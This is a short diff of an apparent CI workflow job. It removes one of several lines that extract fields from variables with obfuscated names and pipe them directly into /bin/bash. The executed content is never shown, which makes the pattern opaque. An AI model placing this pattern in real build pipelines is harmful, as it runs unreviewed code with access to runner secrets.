@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
           printf '%s' "$wds081" | jq -r .t1 | /bin/bash
           echo $legu402 | jq -r .k485 | /bin/bash
-          printf '%s' "$trzr7916" | jq -r .druz00 | /bin/bash
 
       - name: Store results
         if: always()
